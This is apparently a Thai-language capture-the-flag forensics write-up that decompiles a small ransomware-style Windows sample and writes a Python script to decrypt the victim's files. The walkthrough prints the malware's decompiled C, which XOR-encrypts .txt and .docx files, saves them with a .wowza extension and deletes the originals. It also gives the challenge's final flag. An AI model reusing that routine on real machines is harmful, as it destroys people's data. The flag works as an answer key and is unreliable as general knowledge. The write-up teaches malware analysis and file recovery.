> Part 3 : เมื่อเราทราบที่มาของไฟล์นี้เรียบร้อยแล้ว ต่อไปก็ช่วยกู้คืนไฟล์ทั้งหมดกลับมาให้หน่อย แล้วคุณจะได้เจอคำตอบอยู่ในนั้น
>
> (ไฟล์มัลแวร์ได้ถูกเก็บไว้ใน sample.zip อย่างปลอดภัย password : infected)
>
> SHA256 : d4b595fb153d1657ebe5bb3ea2a2f24ff7aeefab1e67b8ba5d4b554693e82afa
>
>Format flag Part 3 : flag{flag}

แตกไฟล์ออกมา จะได้ไฟล์ malware เป็น PE32+ for Windows

![image](https://github.com/user-attachments/assets/3a3712d0-d7ca-41cb-935c-366e5b611b70)

ใช้ Dogbolt ในการ decompile malware file เพื่ออ่าน source code

![image](https://github.com/user-attachments/assets/9c089e5a-7724-4fac-b0df-013d1b80b484)

เลื่อนๆ อ่านโค้ดลงมาจนกระทั่งเจอ function `main()`

```c
int64_t main()
{
    __main();
    void _Str;
    generateKey(&_Str, 8);
    char var_19 = 0;
    struct { struct _finddata64i32_t dd_dta; struct dirent dd_dir; __padding char _234[0x4];long long int dd_handle; int dd_stat; char dd_name[0x1]; }* dirp = opendir(u".…");
    
    if (!dirp)
        return 1;
    
    while (true)
    {
        struct dirent* rax_15 = readdir(dirp);
        
        if (!rax_15)
            break;
        
        void var_58;
        int16_t var_52;
        
        if (!stat(&rax_15->d_name, &var_58) && (var_52 & 0xf000) == 0x4000)
            continue;
        
        if (!strstr(&rax_15->d_name, ".txt") && !strstr(&rax_15->d_name, ".docx"))
            continue;
        
        encryptFileWithXOR(&rax_15->d_name, &_Str, strlen(&_Str));
    }
    
    closedir(dirp);
    return 0;
}
```

จะพบว่ามีการเรียกใช้ 2 functions ที่น่าสนใจก็คือ `generateKey()` และ `encryptFileWithXOR()` ที่จะวนลูปตรวจสอบ directory และทำการเข้ารหัสไฟล์เมื่อพบไฟล์ที่เป็น .txt และ .docx โดยการใช้ function `encryptFileWIthZOR()` และ key ที่ถูกสร้างจาก `generateKey()` ว่าแล้วก็ลงไปดูอีก 2 functions นี้กันต่อ เริ่มจาก `generateKey()`

```c
void* generateKey(int64_t arg1, int64_t arg2)
{
    int64_t var_19;
    __builtin_strncpy(&var_19, "Wowza888", 0x11);
    void* i;
    
    for (; i < arg2; i += 1)
        *(i + arg1) = *(i + &var_19) ^ 8;
    
    return i;
}
```

function `generateKey()` จะใช้ string “Wowza888” ไป XOR กับ 8 โดยจะนำ key ไปเก็บที่ `arg1` และทำงานวนลูปไปจน `arg2` มาดูที่ function `encryptFileWithXOR()`

```c
FILE* encryptFileWithXOR(char* arg1, int64_t arg2, int64_t arg3)
{
    FILE* _Stream = fopen(arg1, "rb");
    
    if (!_Stream)
        return _Stream;
    
    fseek(_Stream, 0, 2);
    int32_t rax_3 = ftell(_Stream);
    fseek(_Stream, 0, 0);
    void* _Buffer = malloc(rax_3);
    
    if (!_Buffer)
        return fclose(_Stream);
    
    fread(_Buffer, 1, rax_3, _Stream);
    fclose(_Stream);
    
    for (int32_t i = 0; i < rax_3; i += 1)
        *(_Buffer + i) ^= *(arg2 + COMBINE(0, i) % arg3);
    
    void var_238;
    snprintf(&var_238, 0x200, "%s.wowza", arg1);
    FILE* _Stream_1 = fopen(&var_238, "wb");
    
    if (_Stream_1)
    {
        fwrite(_Buffer, 1, rax_3, _Stream_1);
        fclose(_Stream_1);
    }
    
    remove(arg1);
    return free(_Buffer);
}
```

function `encryptFileWithXOR()` จะทำการ encrypt file with XOR ด้วย key จาก `generateKey()` แล้วเซฟเป็นไฟล์ `.wowza` ก่อนจะลบไฟล์ต้นฉบับทิ้งไป
พอรู้ logic การทำงานของโค้ดทั้งหมดแล้ว ก็ได้เวลาทำการเขียนโค้ดเพื่อ reverse กู้ไฟล์กลับคืนมา

```python
import os
import glob

# Function to generate the key based on the C code logic
def generate_key(base_key: str):
    """Generate the XOR key by applying XOR 8 to each byte of the base key."""
    return bytearray([byte ^ 8 for byte in base_key.encode()])

# Function to decrypt a file using XOR cipher
def decrypt_file(file_path, key):
    """Decrypt an XOR-encrypted file and restore it."""
    try:
        # Open the encrypted file (with .wowza extension)
        with open(file_path, 'rb') as f:
            encrypted_data = f.read()
        
        # Check if the file is empty or corrupted
        if not encrypted_data:
            print(f"[-] Skipping {file_path}: File is empty or unreadable.")
            return

        # Apply XOR to each byte using the key (repeated for each byte)
        decrypted_data = bytearray(len(encrypted_data))
        for i in range(len(encrypted_data)):
            decrypted_data[i] = encrypted_data[i] ^ key[i % len(key)]

        # Generate the original file name by removing the .wowza extension
        original_file_path = file_path.rsplit('.wowza', 1)[0]

        # Save the decrypted data to the original file name
        with open(original_file_path, 'wb') as f:
            f.write(decrypted_data)

        print(f"[+] Successfully decrypted: {original_file_path}")

    except Exception as e:
        print(f"[-] Error decrypting {file_path}: {e}")

# Main function to decrypt all .wowza files in a given directory
def decrypt_files_in_directory(directory, key):
    """Find and decrypt all .wowza files in the specified directory."""
    wowza_files = glob.glob(os.path.join(directory, "*.wowza"))

    if not wowza_files:
        print("[-] No encrypted (.wowza) files found.")

    for file_path in wowza_files:
        decrypt_file(file_path, key)

if __name__ == "__main__":
    # Generate the key dynamically (avoids hardcoded key errors)
    base_key = "Wowza888"
    key = generate_key(base_key)

    # Use the correct target directory
    encrypted_dir = "/WTCTT2024_F/Forensics/Victim_Triage/C/Users/mirthz/Desktop"

    # Call function to decrypt files
    decrypt_files_in_directory(encrypted_dir, key)

    print("\n[✔] Decryption process completed.")
```

ทำการรัน script เพื่อ decrypt กู้คืนไฟล์ทั้งหมด ทีนี้เราจะได้ไฟล์ original กลับมาแล้ว

![image](https://github.com/user-attachments/assets/0c98e9e6-fc8b-4f7b-bbb9-271e4d2dab58)

![image](https://github.com/user-attachments/assets/820ed850-a8c3-44f6-9462-f469f6308f78)

เริ่มทำการสำรวจไฟล์ เริ่มจากไฟล์ README.txt จะได้ข้อความว่า “The Flag is divided into three parts.” แสดงว่าอยู่ในไฟล์ .docx ที่เหลือสินะ

![image](https://github.com/user-attachments/assets/12cb70f2-ed48-45ff-808e-045d20403da6)

![image](https://github.com/user-attachments/assets/df13d46a-a468-463f-84ce-578f491bcaca)

![image](https://github.com/user-attachments/assets/d695f82e-577d-4c6d-b62d-f1bf0e17ec24)

FLAG: flag{Hello_From_The_Hell_57735773}
